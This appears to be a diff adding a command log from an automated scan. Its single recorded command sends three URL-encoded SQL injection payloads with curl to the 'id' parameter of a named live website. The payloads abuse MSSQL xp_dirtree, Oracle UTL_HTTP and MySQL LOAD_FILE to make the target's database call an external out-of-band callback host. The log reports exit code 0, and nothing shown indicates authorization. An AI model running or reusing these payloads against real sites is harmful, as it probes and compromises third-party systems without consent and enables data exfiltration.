@@ -1,0 +1,4 @@
+# command: timeout 20 sh -c 'curl -s -m 18 -o /dev/null '"'"'https://www.infinitycapital.bh/?id=%27%3BEXEC+master..xp_dirtree+%27%5C%5Coobd5b37ce9f298.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in%5Cx%27%3B--'"'"' ; curl -s -m 18 -o /dev/null '"'"'https://www.infinitycapital.bh/?id=%27+UNION+SELECT+UTL_HTTP.request%28%27http%3A%2F%2Foobd5b37ce9f298.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in%2Fo%27%29+FROM+dual--'"'"' ; curl -s -m 18 -o /dev/null '"'"'https://www.infinitycapital.bh/?id=%27+AND+LOAD_FILE%28%27%5C%5Coobd5b37ce9f298.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in%5Cx%27%29--+-'"'"''
+# exit_code: 0
+# ---
+
